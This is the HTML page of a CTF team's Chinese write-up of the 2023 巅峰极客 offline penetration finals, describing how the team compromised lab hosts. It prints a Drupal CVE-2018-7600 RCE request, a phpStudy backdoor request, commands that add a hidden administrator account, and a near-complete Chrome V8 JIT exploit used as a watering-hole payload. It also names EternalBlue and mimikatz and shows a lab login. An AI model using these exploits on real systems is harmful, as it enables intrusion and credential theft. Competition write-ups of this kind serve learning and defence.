@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="Suers" />
+  
+  
+  <title>2023 巅峰极客决赛  SU WriteUp | su-team</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="渗透," />
+  
+
+  
+  <meta name="description" content="本次巅峰极客决赛为线下渗透赛，我们 SU 取得了 2nd🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com以下是我们 SU 本次 巅峰极客 2023 决赛的 writeup。">
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-02-10",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Suers",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  
+<script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+
+  
+    <link rel="icon" href="/images/SU.ico">
+    <link rel="apple-touch-icon" href="/images/SU.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">SU</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | Write ups of TEAM-SU</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/about/" target="_self">关于</a>
+      
+        <a href="/links/" target="_self">成员</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/team-su/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/tags/" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/about/" target="_self">
+            关于
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/links/" target="_self">
+            成员
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2023-08-24
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    2023 巅峰极客决赛  SU WriteUp
+  </h1>
+  
+  <article class="passage-article">
+    <hr>
+<p>本次巅峰极客决赛为线下渗透赛，我们 SU 取得了 2nd🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a></p>
+<p>以下是我们 SU 本次 巅峰极客 2023 决赛的 writeup。</p>
+<h2 id="赛制描述"><a href="#赛制描述" class="headerlink" title="赛制描述"></a>赛制描述</h2><p>本次比赛一共8小时，上午10点到下午6点，多层网络渗透赛，其中包含了一些工控的点，工控和渗透比重五五开，不过大多都是打渗透拿分。比赛中不允许选手联网，但是有联网区4根网线可以上网下资料，由于赛中不需要交wp，本wp是感觉回忆描述而来，如有偏差，多多包涵。</p>
+<h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>本次比赛没有提供网络拓扑，需要自己攻击一步步推理，但是比赛的中途给了一个题目“比赛中可以根据大屏幕上的拓扑图推测逻辑”，但是屏幕又远又花，而且图很抽象。<br><img src="1.jpg" alt=""></p>
+<p>所以根据实际情况我们画了一张自己感觉上的图(事后根据回忆画的，有些差异)<br><img src="2.png" alt=""></p>
+<h3 id="1、招聘网站173-20-1-94"><a href="#1、招聘网站173-20-1-94" class="headerlink" title="1、招聘网站173.20.1.94"></a>1、招聘网站173.20.1.94</h3><p>因为开场题目只给了这个ip，所以大家都在打这个，这个招聘网站是直接打的drupal远程代码执行 (CVE-2018-7600),在vulhub上有直接的exp<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span><br></pre></td></tr></table></figure><br>拿下后，本来想尝试拿这台服务器搭建代理，或者提权等，大概过了1小时，发了公告1、招聘网站只是一个签到，不需要深入利用，然后开始扫描173.20.1.x/24</p>
+<h3 id="2、门户网站-173-20-1-53"><a href="#2、门户网站-173-20-1-53" class="headerlink" title="2、门户网站 173.20.1.53"></a>2、门户网站 173.20.1.53</h3><p>这就很奇怪了，主办方没给公告之前扫了很多次没东西，发了公告后直接扫描到了这个网站，而且给了phpinfo，phpinfo提供了php版本是 5.4.45,存在phpstudy的后门漏洞，poc直接打。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Encoding:gzip,deflate</span><br><span class="line">Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure><br>这个是windows写马挺怪的，花了一些时间上去，发现是高权限用户，命令执行增加用户<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user dddd123 dddqwe@!@# /add</span><br><span class="line">net localgroup administrators dddd123 /add </span><br></pre></td></tr></table></figure><br>然后使用猕猴桃可以抓admin到密码，同时存在wireshark软件</p>
+<h3 id="3、办公电脑-15-100-70-10"><a href="#3、办公电脑-15-100-70-10" class="headerlink" title="3、办公电脑 15.100.70.10"></a>3、办公电脑 15.100.70.10</h3><p>主办方多次暗示，这个办公电脑会使用浏览器也访问门户。这题应该是最恶心的一个点。<br>因为拿下来门户，可以直接挂黑页水坑攻击，我们在173.20.1.53上挂一个恶意js，让办公电脑访问到rce。<br>首先我们使用门户网站上的wireshark软件抓到办公电脑访问的流量，其中看到了头部带有的ua，显示是89.0.4389.114。<br>刚好是2021年爆出来的chrome 0day rce版本。</p>
+<p>中途大概就两三个队打了，主办方考虑到大家没啥环境，就给了cs4.2版本。最良心的是把exp也给了，再到最后直接给了word说明文档<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   function gc() &#123;</span><br><span class="line">       for (var i = 0; i &lt; 0x80000; ++i) &#123;</span><br><span class="line">           var a = new ArrayBuffer();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   let shellcode = [不告诉你];</span><br><span class="line">   var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);</span><br><span class="line">   var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">   var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">   var main = wasmInstance.exports.main;</span><br><span class="line">   var bf = new ArrayBuffer(8);</span><br><span class="line">   var bfView = new DataView(bf);</span><br><span class="line">   function fLow(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return (bfView.getUint32(0, true));</span><br><span class="line">  &#125;</span><br><span class="line">   function fHi(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return (bfView.getUint32(4, true))</span><br><span class="line">  &#125;</span><br><span class="line">   function i2f(low, hi) &#123;</span><br><span class="line">       bfView.setUint32(0, low, true);</span><br><span class="line">       bfView.setUint32(4, hi, true);</span><br><span class="line">       return bfView.getFloat64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   function f2big(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return bfView.getBigUint64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   function big2f(b) &#123;</span><br><span class="line">       bfView.setBigUint64(0, b, true);</span><br><span class="line">       return bfView.getFloat64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   class LeakArrayBuffer extends ArrayBuffer &#123;</span><br><span class="line">       constructor(size) &#123;</span><br><span class="line">           super(size);</span><br><span class="line">           this.slot = 0xb33f;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   function foo(a) &#123;</span><br><span class="line">       let x = -1;</span><br><span class="line">       if (a) x = 0xFFFFFFFF;</span><br><span class="line">       var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));</span><br><span class="line">       arr.shift();</span><br><span class="line">       let local_arr = Array(2);</span><br><span class="line">       local_arr[0] = 5.1;//4014666666666666</span><br><span class="line">       let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8</span><br><span class="line">       arr[0] = 0x1122;</span><br><span class="line">       return [arr, local_arr, buff];</span><br><span class="line">  &#125;</span><br><span class="line">   for (var i = 0; i &lt; 0x10000; ++i)</span><br><span class="line">       foo(false);</span><br><span class="line">   gc(); gc();</span><br><span class="line">  [corrput_arr, rwarr, corrupt_buff] = foo(true);</span><br><span class="line">   corrput_arr[12] = 0x22444;</span><br><span class="line">   delete corrput_arr;</span><br><span class="line">   function setbackingStore(hi, low) &#123;</span><br><span class="line">       rwarr[4] = i2f(fLow(rwarr[4]), hi);</span><br><span class="line">       rwarr[5] = i2f(low, fHi(rwarr[5]));</span><br><span class="line">  &#125;</span><br><span class="line">   function leakObjLow(o) &#123;</span><br><span class="line">       corrupt_buff.slot = o;</span><br><span class="line">       return (fLow(rwarr[9]) - 1);</span><br><span class="line">  &#125;</span><br><span class="line">   let corrupt_view = new DataView(corrupt_buff);</span><br><span class="line">   let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);</span><br><span class="line">   let idx0Addr = corrupt_buffer_ptr_low - 0x10;</span><br><span class="line">   let baseAddr = (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;</span><br><span class="line">   let delta = baseAddr + 0x1c - idx0Addr;</span><br><span class="line">   if ((delta % 8) == 0) &#123;</span><br><span class="line">       let baseIdx = delta / 8;</span><br><span class="line">       this.base = fLow(rwarr[baseIdx]);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">       let baseIdx = ((delta - (delta % 8)) / 8);</span><br><span class="line">       this.base = fHi(rwarr[baseIdx]);</span><br><span class="line">  &#125;</span><br><span class="line">   let wasmInsAddr = leakObjLow(wasmInstance);</span><br><span class="line">   setbackingStore(wasmInsAddr, this.base);</span><br><span class="line">   let code_entry = corrupt_view.getFloat64(13 * 8, true);</span><br><span class="line">   setbackingStore(fLow(code_entry), fHi(code_entry));</span><br><span class="line">   for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">       corrupt_view.setUint8(i, shellcode[i]);</span><br><span class="line">  &#125;</span><br><span class="line">   main();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>这里生成的shellcode本来是被火绒杀的了，但是比赛到一半主办方说基于很多人没做出来，就挨个把火绒关闭了，hhh。基本上大家都能通过这个直接上线了。</p>
+<h3 id="4、智慧水利服务-15-100-70-100"><a href="#4、智慧水利服务-15-100-70-100" class="headerlink" title="4、智慧水利服务 15.100.70.100"></a>4、智慧水利服务 15.100.70.100</h3><p>这一台就有点恶心了上面有4个web题，4个flag。但是因为只有办公电脑通他。我们本地和门户均不通，所以代理这一块就很蛋疼，其实只要代理到了本地就不是很难了。<br>分别是<br>1、80端口 discuz 7.2的rce<br>2、8080端口 禅道cnvd_2020_121325<br>3、3030端口 traggo 这玩意到了后台 不知道怎么打<br>4、8443端口的ofbiz 反序列化<br>这里比较恶心的是禅道其实是后台洞，需要打了discuz然后根目录下拿到flag，flag文件后面留了禅道管理员的密码</p>
+<h3 id="5、工程师站192-168-2-100"><a href="#5、工程师站192-168-2-100" class="headerlink" title="5、工程师站192.168.2.100"></a>5、工程师站192.168.2.100</h3><p>在办公电脑上浏览器打开了192的一个网站，猜测存在192段的地址。然后扫描直接扫到了192.168.2.100存在永恒之蓝，正要去网上下资料的时候，主办方提供了一下“永恒之蓝利用工具”，他真的，我哭死，直接打了上192.168.2.100，</p>
+<h3 id="6、操作员站192-168-2-210"><a href="#6、操作员站192-168-2-210" class="headerlink" title="6、操作员站192.168.2.210"></a>6、操作员站192.168.2.210</h3><p>楠哥在上面玩工控的时候发现了一个账号密码信息<br>Operator Station’s<br>IP:192.168.2.210<br>User:monitor<br>Password:nTwn3q3^ph71A<br>这个是操作员站的密码，猜测是rdp的，就直接上了，然后用猕猴桃读密码rdp，管理员桌面存在一个flag和几个软件。</p>
+<h3 id="7、工控-192-168-2-200"><a href="#7、工控-192-168-2-200" class="headerlink" title="7、工控 192.168.2.200"></a>7、工控 192.168.2.200</h3><p>在210和110上都有一些工控相关的内容，比如210的管理员账号的浏览器默认打开了192.168.2.200<br><img src="3.png" alt=""></p>
+<p>至此渗透相关的应该都打了，其实漏洞都不是很难，主要是代理太多很难受。接下来按照题目的描述是在210上存在wireshark软件，使用wireshark抓210和220的通讯流量分析制定的题目。</p>
+<p><img src="4.jpg" alt=""></p>
+<p><img src="5.jpg" alt=""></p>
+<p>工控wp待续….</p>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E5%88%B6%E6%8F%8F%E8%BF%B0"><span class="toc-text">赛制描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%8B%9B%E8%81%98%E7%BD%91%E7%AB%99173-20-1-94"><span class="toc-text">1、招聘网站173.20.1.94</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%97%A8%E6%88%B7%E7%BD%91%E7%AB%99-173-20-1-53"><span class="toc-text">2、门户网站 173.20.1.53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%8A%9E%E5%85%AC%E7%94%B5%E8%84%91-15-100-70-10"><span class="toc-text">3、办公电脑 15.100.70.10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E6%99%BA%E6%85%A7%E6%B0%B4%E5%88%A9%E6%9C%8D%E5%8A%A1-15-100-70-100"><span class="toc-text">4、智慧水利服务 15.100.70.100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%AB%99192-168-2-100"><span class="toc-text">5、工程师站192.168.2.100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81%E6%93%8D%E4%BD%9C%E5%91%98%E7%AB%99192-168-2-210"><span class="toc-text">6、操作员站192.168.2.210</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81%E5%B7%A5%E6%8E%A7-192-168-2-200"><span class="toc-text">7、工控 192.168.2.200</span></a></li></ol></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: SUers</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://team-su.github.io/2023/08/24/2023-08-24-DFJKfinal/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/%E6%B8%97%E9%80%8F/"><i class="fa fa-tags"></i>渗透</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: suers_xctf@126.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2023/10/30/2023-10-28-ACTF/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2023/08/24/2023-05-17gyb/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-112937997-3"></script>
+  <script async>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-112937997-3');
+  </script>
+
+
+
+
+
+
+    
+  </body>
+</html>
